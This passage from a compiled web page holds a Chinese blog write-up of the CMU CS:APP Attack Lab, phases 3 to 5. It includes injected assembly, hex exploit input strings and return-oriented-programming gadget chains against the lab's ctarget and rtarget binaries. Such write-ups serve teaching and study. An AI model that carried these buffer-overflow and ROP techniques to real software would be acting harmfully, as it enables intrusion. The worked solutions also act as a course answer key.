0;\n}\n')),(0,l.kt)("p",null,"\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u8981\u628a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u8f6c\u6362\u6210\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u4f20\u8fdb\u53bb"),(0,l.kt)("p",null,"\u6ce8\u610f\u7b2c6\u884c\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"s"),"\u7684\u4f4d\u7f6e\u662f\u968f\u673a\u7684\uff0c\u6211\u4eec\u5199\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u6808\u4e2d\u7684\u5b57\u7b26\u4e32\u5f88\u6709\u53ef\u80fd\u88ab\u8986\u76d6\uff0c\u4e00\u65e6\u88ab\u8986\u76d6\u5c31\u65e0\u6cd5\u6b63\u5e38\u6bd4\u8f83\u3002"),(0,l.kt)("p",null,"\u56e0\u6b64\uff0c\u8003\u8651\u628a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u7684\u5b57\u7b26\u4e32\u6570\u636e\u5b58\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u7684\u6808\u4e0a\uff0c\u5176\u5b83\u90e8\u5206\u4e0e\u4e0a\u9898\u76f8\u540c\uff0c\u8fd9\u91cc\u4e0d\u518d\u91cd\u590d\u601d\u8def\u3002"),(0,l.kt)("h3",{id:"\u6ce8\u5165\u4ee3\u7801-1"},"\u6ce8\u5165\u4ee3\u7801"),(0,l.kt)("p",null,"\u5148\u67e5\u627e",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u6808\u9876\u6307\u9488\u7684\u4f4d\u7f6e\uff1a"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(44135).Z,width:"960",height:"458"})),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"0x5561dca8"),"\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u5b57\u7b26\u4e32\u5b58\u653e\u7684\u4f4d\u7f6e\uff0c\u4e5f\u662f\u8c03\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"touch3"),"\u5e94\u8be5\u4f20\u5165\u7684\u53c2\u6570\uff0c\u53c8",(0,l.kt)("inlineCode",{parentName:"p"},"touch3"),"\u4ee3\u7801\u7684\u5730\u5740\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"4018fa"),"\u3002\u4ece\u800c\u5f97\u5230\u4ee3\u7801\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq    $0x5561dca8, %rdi\npushq   $0x4018fa\nret\n")),(0,l.kt)("p",null,"\u5b57\u8282\u7ea7\u8868\u793a\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"Disassembly of section .text:\n\n0000000000000000 <.text>:\n   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi\n   7:   68 fa 18 40 00          pushq  $0x4018fa\n   c:   c3                      retq\n")),(0,l.kt)("h3",{id:"\u6808\u5e27\u8bb2\u89e3-1"},"\u6808\u5e27\u8bb2\u89e3"),(0,l.kt)("p",null,"\u6211\u4eec\u671f\u671b\u7684\u6808\u5e27\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(78103).Z,width:"1300",height:"684"})),(0,l.kt)("p",null,"\u903b\u8f91\u5982\u4e0b\uff1a"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"getbuf"),"\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\uff0c\u4ece\u6808\u4e2d\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230\u6211\u4eec\u6ce8\u5165\u7684\u4ee3\u7801"),(0,l.kt)("li",{parentName:"ul"},"\u4ee3\u7801\u6267\u884c\uff0c\u5148\u5c06\u5b58\u5728",(0,l.kt)("inlineCode",{parentName:"li"},"caller"),"\u7684\u6808\u4e2d\u7684\u5b57\u7b26\u4e32\u4f20\u7ed9\u53c2\u6570\u5bc4\u5b58\u5668",(0,l.kt)("inlineCode",{parentName:"li"},"%rdi"),"\uff0c\u518d\u5c06",(0,l.kt)("inlineCode",{parentName:"li"},"touch3"),"\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d"),(0,l.kt)("li",{parentName:"ul"},"\u4ee3\u7801\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\uff0c\u4ece\u6808\u4e2d\u5f39\u51fa",(0,l.kt)("inlineCode",{parentName:"li"},"touch3"),"\u6307\u4ee4\uff0c\u6210\u529f\u8df3\u8f6c")),(0,l.kt)("h3",{id:"solution-2"},"Solution"),(0,l.kt)("p",null,"\u6211\u4eec\u7684cookie",(0,l.kt)("inlineCode",{parentName:"p"},"0x59b997fa"),"\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"ASCII"),"\u4e3a\uff1a",(0,l.kt)("inlineCode",{parentName:"p"},"35 39 62 39 39 37 66 61")),(0,l.kt)("p",null,"\u6ce8\u5165\u4ee3\u7801\u6bb5\u7684\u5730\u5740\u4e0e\u4e0a\u9898\u4e00\u6837\uff0c\u540c\u6837\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"0x5561dc78")),(0,l.kt)("p",null,"\u7531\u4e8e\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u6808\u5e27\u4e2d\u591a\u5229\u7528\u4e86\u4e00\u4e2a\u5b57\u8282\u5b58\u653ecookie\uff0c\u6240\u4ee5\u672c\u9898\u8981\u8f93\u516556\u4e2a\u5b57\u8282\u3002\u6ce8\u5165\u4ee3\u7801\u7684\u5b57\u8282\u8868\u793a\u653e\u5728\u5f00\u5934\uff0c33-40\u4e2a\u5b57\u8282\u653e\u7f6e\u6ce8\u5165\u4ee3\u7801\u7684\u5730\u5740\u7528\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u6700\u540e\u516b\u4e2a\u5b57\u8282\u5b58\u653ecookie\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"ASCII")," \u3002\u4e8e\u662f\u5f97\u5230\u5982\u4e0b\u8f93\u5165\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"48 c7 c7 a8 dc 61 55 68 \nfa 18 40 00 c3 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n78 dc 61 55 00 00 00 00\n35 39 62 39 39 37 66 61\n")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(57626).Z,width:"958",height:"298"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u653b\u51fb\u6210\u529f\uff01")),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"Part 1"),"\u5c31\u6b64\u5b8c\u7ed3\u5566\uff01"),(0,l.kt)("h2",{id:"part-2-return-oriented-programming"},"Part 2: Return-Oriented Programming"),(0,l.kt)("p",null,"\u5728\u7b2c\u4e8c\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u8981\u653b\u51fb\u7684\u662f",(0,l.kt)("inlineCode",{parentName:"p"},"rtarget"),"\uff0c\u5b83\u7684\u4ee3\u7801\u5185\u5bb9\u4e0e\u7b2c\u4e00\u90e8\u5206\u57fa\u672c\u76f8\u540c\uff0c\u4f46\u662f\u653b\u51fb\u5b83\u5374\u6bd4\u7b2c\u4e00\u90e8\u5206\u8981\u96be\u5f97\u591a\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u5b83\u91c7\u7528\u4e86\u4e24\u79cd\u7b56\u7565\u6765\u5bf9\u6297\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"\u6808\u968f\u673a\u5316\u3002\u8fd9\u6bb5\u7a0b\u5e8f\u5206\u914d\u7684\u6808\u7684\u4f4d\u7f6e\u5728\u6bcf\u6b21\u8fd0\u884c\u65f6\u90fd\u662f\u968f\u673a\u7684\uff0c\u8fd9\u5c31\u4f7f\u6211\u4eec\u65e0\u6cd5\u786e\u5b9a\u5728\u54ea\u91cc\u63d2\u5165\u4ee3\u7801"),(0,l.kt)("li",{parentName:"ul"},"\u9650\u5236\u53ef\u6267\u884c\u4ee3\u7801\u533a\u57df\u3002\u5b83\u9650\u5236\u6808\u4e0a\u5b58\u653e\u7684\u4ee3\u7801\u662f\u4e0d\u53ef\u6267\u884c\u7684\u3002")),(0,l.kt)("p",null,"\u770b\u5230\u8fd9\u91cc\uff0c\u6211\u4e0d\u7981\u4e00\u5934\u96fe\u6c34\uff0c\u8fd9\u4e0b\u5b50\u8be5\u600e\u4e48\u653b\u51fb\u554a\uff1f"),(0,l.kt)("p",null,"\u5e86\u5e78\u7684\u662f\uff0c\u6587\u6863\u4e5f\u63d0\u4f9b\u4e86\u653b\u51fb\u7b56\u7565\uff0c\u5373",(0,l.kt)("strong",{parentName:"p"},"ROP\uff1a\u9762\u5411\u8fd4\u56de\u7684\u7a0b\u5e8f\u8bbe\u8ba1"),"\uff0c\u5c31\u662f\u5728\u5df2\u7ecf\u5b58\u5728\u7684\u7a0b\u5e8f\u4e2d\u627e\u5230\u7279\u5b9a\u7684\u4ee5",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\u4e3a\u6211\u4eec\u6240\u7528\uff0c\u79f0\u8fd9\u6837\u7684\u4ee3\u7801\u6bb5\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\uff0c\u628a\u8981\u7528\u5230\u90e8\u5206\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d\uff0c\u6bcf\u6b21",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u540e\u53c8\u4f1a\u53d6\u51fa\u4e00\u4e2a\u65b0\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\uff0c\u4e8e\u662f\u8fd9\u6837\u5c31\u80fd\u5f62\u6210\u4e00\u4e2a\u7a0b\u5e8f\u94fe\uff0c\u5b9e\u73b0\u6211\u4eec\u7684\u76ee\u7684\u3002",(0,l.kt)("strong",{parentName:"p"},"\u6211\u559c\u6b22\u5c06\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u79f0\u4f5c\u201c\u5c31\u5730\u53d6\u6750\uff0c\u62fc\u51d1\u4ee3\u7801\u201d"),"\u3002"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(15895).Z,width:"1675",height:"664"})),(0,l.kt)("p",null,"\u540c\u65f6\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u6307\u4ee4\u7f16\u7801\u8868\uff1a"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(69374).Z,width:"1010",height:"1006"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u4e3e\u4e2a\u4f8b\u5b50\uff1a")),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"rtarget"),"\u6709\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},"void setval_210(unsigned *p)\n{\n    *p = 3347663060U;\n}\n")),(0,l.kt)("p",null,"\u5b83\u7684\u6c47\u7f16\u4ee3\u7801\u5b57\u8282\u7ea7\u8868\u793a\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"0000000000400f15 <setval_210>:\n    400f15: c7 07 d4 48 89 c7   movl $0xc78948d4,(%rdi)\n    400f1b: c3                  retq\n")),(0,l.kt)("p",null,"\u67e5\u8868\u53ef\u77e5\uff0c\u53d6\u5176\u4e2d\u4e00\u90e8\u5206\u5b57\u8282\u5e8f\u5217 48 89 c7 \u5c31\u8868\u793a\u6307\u4ee4",(0,l.kt)("inlineCode",{parentName:"p"},"movq %rax, %rdi"),"\uff0c\u8fd9\u6574\u53e5\u6307\u4ee4\u7684\u5730\u5740\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"0x400f15"),"\uff0c\u4e8e\u662f\u4ece",(0,l.kt)("inlineCode",{parentName:"p"},"0x400f18"),"\u5f00\u59cb\u7684\u4ee3\u7801\u5c31\u53ef\u4ee5\u53d8\u6210\u4e0b\u9762\u8fd9\u6837\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq %rax, %rdi\nret\n")),(0,l.kt)("p",null,"\u8fd9\u4e2a\u5c0f\u7247\u6bb5\u5c31\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\u4e3a\u6211\u4eec\u6240\u7528\u3002"),(0,l.kt)("p",null,"\u5176\u5b83\u4e00\u4e9b\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7684\u4ee3\u7801\u90fd\u5728\u6587\u4ef6",(0,l.kt)("inlineCode",{parentName:"p"},"farm.c"),"\u4e2d\u5c55\u793a\u4e86\u51fa\u6765"),(0,l.kt)("h2",{id:"phase-4"},"Phase 4"),(0,l.kt)("h3",{id:"\u5206\u6790-3"},"\u5206\u6790"),(0,l.kt)("p",null,"\u672c\u9898\u7684\u4efb\u52a1\u4e0e",(0,l.kt)("inlineCode",{parentName:"p"},"Phase 2"),"\u76f8\u540c\uff0c\u90fd\u662f\u8981\u6c42\u8fd4\u56de\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"touch2"),"\u51fd\u6570\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"phase 2"),"\u4e2d\u7528\u5230\u7684\u6ce8\u5165\u4ee3\u7801\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq    $0x59b997fa, %rdi\npushq   $0x4017ec\nret\n")),(0,l.kt)("p",null,"\u6211\u4eec\u6839\u672c\u4e0d\u53ef\u80fd\u627e\u5230\u8fd9\u79cd\u5e26\u7279\u5b9a\u7acb\u5373\u6570\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\uff0c\u53ea\u80fd\u601d\u8003\u5176\u4ed6\u529e\u6cd5\u3002"),(0,l.kt)("p",null,"\u9996\u5148\uff0c\u8981\u505a\u7684\u662f\u628a cookie \u8d4b\u503c\u7ed9\u53c2\u6570\u5bc4\u5b58\u5668",(0,l.kt)("inlineCode",{parentName:"p"},"%rdi"),"\uff0c\u8003\u8651\u5c06 cookie \u653e\u5728\u6808\u4e2d\uff0c\u518d\u7528\u6307\u4ee4\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"pop %rdi\nret\n")),(0,l.kt)("p",null,"\u5c31\u80fd\u5b9e\u73b0\u53c2\u6570\u7684\u8d4b\u503c\u4e86\uff0c\u5f53",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u540e\uff0c\u4ece\u6808\u4e2d\u53d6\u51fa\u6765\u7684\u7a0b\u5e8f\u5730\u5740\u518d\u8bbe\u7f6e\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"touch2"),"\u7684\u5730\u5740\u5c31\u80fd\u6210\u529f\u89e3\u51b3\u672c\u9898"),(0,l.kt)("p",null,"\u4f46\u662f\u540e\u6765\u53d1\u73b0\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"farm"),"\u4e2d\u627e\u4e0d\u5230\u8fd9\u6761\u6307\u4ee4\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\uff0c\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\uff0c\u53ea\u597d\u7528\u5176\u4ed6\u5bc4\u5b58\u5668\u8fdb\u884c\u4e2d\u8f6c\uff0c\u8003\u8651\u7528\u4e24\u4e2a",(0,l.kt)("inlineCode",{parentName:"p"},"gadget")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"popq %rax\nret\n###############\nmovq %rax, %rdi\nret\n")),(0,l.kt)("h3",{id:"\u6808\u5e27\u8bb2\u89e3-2"},"\u6808\u5e27\u8bb2\u89e3"),(0,l.kt)("p",null,"\u6839\u636e\u6211\u4eec\u7684\u601d\u8def\uff0c\u6808\u5e27\u60c5\u51b5\u5982\u4e0b\uff1a"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(49252).Z,width:"1241",height:"726"})),(0,l.kt)("p",null,"\u903b\u8f91\u5982\u4e0b\uff1a"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"getbuf"),"\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\uff0c\u4ece\u6808\u4e2d\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230\u6211\u4eec\u7684",(0,l.kt)("inlineCode",{parentName:"li"},"gardget01")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"gadget01"),"\u6267\u884c\uff0c\u5c06",(0,l.kt)("inlineCode",{parentName:"li"},"cookie"),"\u5f39\u51fa\uff0c\u8d4b\u503c\u7ed9",(0,l.kt)("inlineCode",{parentName:"li"},"%rax"),"\uff0c\u7136\u540e\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\uff0c\u7ee7\u7eed\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230",(0,l.kt)("inlineCode",{parentName:"li"},"gardget2")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"gardget2"),"\u6267\u884c\uff0c\u5c06",(0,l.kt)("inlineCode",{parentName:"li"},"cookie"),"\u503c\u6210\u529f\u8d4b\u503c\u7ed9\u53c2\u6570\u5bc4\u5b58\u5668",(0,l.kt)("inlineCode",{parentName:"li"},"%rdi"),"\uff0c\u7136\u540e\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\uff0c\u7ee7\u7eed\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230",(0,l.kt)("inlineCode",{parentName:"li"},"touch2"))),(0,l.kt)("h3",{id:"solution-3"},"Solution"),(0,l.kt)("p",null,"\u9996\u8981\u95ee\u9898\u662f\u627e\u5230\u6211\u4eec\u9700\u8981\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"gadget")),(0,l.kt)("p",null,"\u5148\u7528\u5982\u4e0b\u6307\u4ee4\u5f97\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"target"),"\u7684\u6c47\u7f16\u4ee3\u7801\u53ca\u5b57\u8282\u7ea7\u8868\u793a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"objdump -d rtarget > rtarget.s\n")),(0,l.kt)("p",null,"\u67e5\u8868\u77e5\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"pop %rax"),"\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"58"),"\u8868\u793a\uff0c\u4e8e\u662f\u67e5\u627e",(0,l.kt)("inlineCode",{parentName:"p"},"58")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"00000000004019a7 <addval_219>:\n  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax\n  4019ad:       c3                      retq                   retq\n")),(0,l.kt)("p",null,"\u5f97\u5230\u6307\u4ee4\u5730\u5740\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4019ab")),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"movq %rax, %rdi"),"\u8868\u793a\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"48 89 c7"),"\uff0c\u521a\u597d\u80fd\u627e\u5230\uff01\u5176\u4e2d 90 \u8868\u793a\u201c\u7a7a\u201d\uff0c\u53ef\u4ee5\u5ffd\u7565"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"00000000004019c3 <setval_426>:\n  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)\n  4019c9:       c3                      retq\n")),(0,l.kt)("p",null,"\u5f97\u5230\u6307\u4ee4\u5730\u5740\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4019c5")),(0,l.kt)("p",null,"\u6839\u636e\u4e0a\u56fe\u7684\u6808\u5e27\uff0c\u5c31\u80fd\u5199\u51fa\u6211\u4eec\u7684\u8f93\u5165\u5e8f\u5217\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\nab 19 40 00 00 00 00 00\nfa 97 b9 59 00 00 00 00\nc5 19 40 00 00 00 00 00\nec 17 40 00 00 00 00 00\n")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(26124).Z,width:"961",height:"325"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u653b\u51fb\u6210\u529f\uff01")),(0,l.kt)("h2",{id:"phase-5"},"Phase 5"),(0,l.kt)("p",null,"\u5148\u9644\u4e0a",(0,l.kt)("inlineCode",{parentName:"p"},"Write up"),"\u4e2d\u6765\u81ea CMU \u5b98\u65b9\u7684\u529d\u9000\uff1a"),(0,l.kt)("blockquote",null,(0,l.kt)("p",{parentName:"blockquote"},"Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That\u2019s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a  true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.")),(0,l.kt)("p",null,"\u73b0\u5728\u662f\u665a\u4e0a 23:20\uff0c\u6211\u672c\u6765\u5df2\u7ecf\u5934\u660f\u773c\u82b1\u51c6\u5907\u5c31\u5bdd\u660e\u65e5\u518d\u6218\u3002\u4f46\u770b\u5230\u8fd9\u6bb5\u8bdd\uff0c\u597d\u5bb6\u4f19\uff0c\u4e0d\u4ec5\u6ca1\u628a\u6211\u529d\u9000\uff0c\u8fd8\u8ba9\u6211\u7684\u56f0\u610f\u4e00\u4e0b\u5b50\u6d88\u5931\uff0c\u7cbe\u795e\u632f\u594b\u4e86\u8d77\u6765\u3002"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u957f\u7f28\u5df2\u5728\u624b\uff0c\u7f1a\u4f4f\u82cd\u9f99\u5c31\u5728\u4eca\u65e5\uff01")),(0,l.kt)("h3",{id:"\u5206\u6790-4"},"\u5206\u6790"),(0,l.kt)("p",null,"\u672c\u9898\u7684\u4efb\u52a1\u4e0e",(0,l.kt)("inlineCode",{parentName:"p"},"Phase 3"),"\u76f8\u540c\uff0c\u90fd\u662f\u8981\u6c42\u8fd4\u56de\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"touch3"),"\u51fd\u6570"),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"Phase 3"),"\u4e2d\u7528\u5230\u7684\u6ce8\u5165\u4ee3\u7801\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq    $0x5561dca8, %rdi\npushq   $0x4018fa\nret\n")),(0,l.kt)("p",null,"\u5176\u4e2d",(0,l.kt)("inlineCode",{parentName:"p"},"0x5561dca8"),"\u662f\u6808\u4e2d",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u5b58\u653e\u7684\u5730\u5740\u3002"),(0,l.kt)("p",null,"\u800c\u5728\u672c\u9898\u4e2d\uff0c\u6808\u7684\u4f4d\u7f6e\u662f\u968f\u673a\u7684\uff0c\u628a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u5b58\u653e\u5728\u6808\u4e2d\u4f3c\u4e4e\u4e0d\u592a\u73b0\u5b9e\uff0c\u4f46\u662f\u6211\u4eec\u53c8\u4e0d\u5f97\u4e0d\u8fd9\u6837\u505a\uff0c\u90a3\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u53ea\u80fd\u5728\u4ee3\u7801\u4e2d\u83b7\u53d6",(0,l.kt)("inlineCode",{parentName:"p"},"%rsp"),"\u7684\u5730\u5740\uff0c\u7136\u540e\u6839\u636e\u504f\u79fb\u91cf\u6765\u786e\u5b9a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u7684\u5730\u5740\u3002\u60f3\u5230\u8fd9\uff0c\u601d\u8def\u5c31\u660e\u6670\u4e86\u3002"),(0,l.kt)("p",null,"\u67e5\u8868\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"movq %rsp, xxx"),"\u8868\u793a\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"48 89 xx"),"\uff0c\u67e5\u627e\u4e00\u4e0b\u6709\u6ca1\u6709\u53ef\u7528\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"gadget")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"0000000000401aab <setval_350>:\n  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)\n  401ab1:       c3                      retq\n")),(0,l.kt)("p",null,"\u8fd8\u771f\u627e\u5230\u4e86\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"48 89 e0"),"\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u4e3a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq %rsp, %rax\n")),(0,l.kt)("p",null,"\u5730\u5740\u4e3a\uff1a",(0,l.kt)("inlineCode",{parentName:"p"},"0x401aad")),(0,l.kt)("p",null,"\u6839\u636e\u63d0\u793a\uff0c\u6709\u4e00\u4e2a",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\u4e00\u5b9a\u8981\u7528\u4e0a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"}," 00000000004019d6 <add_xy>:\n   4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax\n   4019da:       c3                      retq\n")),(0,l.kt)("p",null,"\u5730\u5740\u4e3a\uff1a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4019d6")),(0,l.kt)("p",null,"\u901a\u8fc7\u5408\u9002\u7684\u8d4b\u503c\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5c31\u80fd\u5b9e\u73b0",(0,l.kt)("inlineCode",{parentName:"p"},"%rsp"),"\u52a0\u4e0a\u6bb5\u5185\u504f\u79fb\u5730\u5740\u6765\u786e\u5b9a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u7684\u4f4d\u7f6e"),(0,l.kt)("p",null,"\u5269\u4e0b\u90e8\u5206\u6d41\u7a0b\u4e0e",(0,l.kt)("inlineCode",{parentName:"p"},"Phase 3"),"\u4e00\u81f4\uff0c\u5927\u4f53\u601d\u8def\u5982\u4e0b\uff1a"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"\u5148\u53d6\u5f97\u6808\u9876\u6307\u9488\u7684\u4f4d\u7f6e"),(0,l.kt)("li",{parentName:"ul"},"\u53d6\u51fa\u5b58\u5728\u6808\u4e2d\u5f97\u504f\u79fb\u91cf\u7684\u503c"),(0,l.kt)("li",{parentName:"ul"},"\u901a\u8fc7",(0,l.kt)("inlineCode",{parentName:"li"},"lea    (%rdi,%rsi,1),%rax"),"\u5f97\u5230 cookie \u7684\u5730\u5740"),(0,l.kt)("li",{parentName:"ul"},"\u5c06 cookie \u7684\u5730\u5740\u4f20\u7ed9",(0,l.kt)("inlineCode",{parentName:"li"},"%rdi")),(0,l.kt)("li",{parentName:"ul"},"\u8c03\u7528",(0,l.kt)("inlineCode",{parentName:"li"},"touch 3"))),(0,l.kt)("p",null,"\u7531\u4e8e",(0,l.kt)("inlineCode",{parentName:"p"},"gadget"),"\u7684\u9650\u5236\uff0c\u4e2d\u95f4\u7684\u7ec6\u8282\u9700\u8981\u5f88\u591a\u5c1d\u8bd5\uff0c\u5c1d\u8bd5\u8fc7\u7a0b\u4e0d\u518d\u4e00\u4e00\u5217\u4e3e\u4e86\uff0c\u6211\u4eec\u76f4\u63a5\u7ed9\u51fa\u4ee3\u7801"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"#\u5730\u5740\uff1a0x401aad\nmovq %rsp, %rax\nret\n\n#\u5730\u5740\uff1a0x4019a2\nmovq %rax, %rdi\nret\n\n#\u5730\u5740\uff1a0x4019cc\npopq %rax\nret\n\n#\u5730\u5740\uff1a0x4019dd\nmovl %eax, %edx\nret\n\n#\u5730\u5740\uff1a0x401a70\nmovl %edx, %ecx\nret\n\n#\u5730\u5740\uff1a0x401a13\nmovl %ecx, 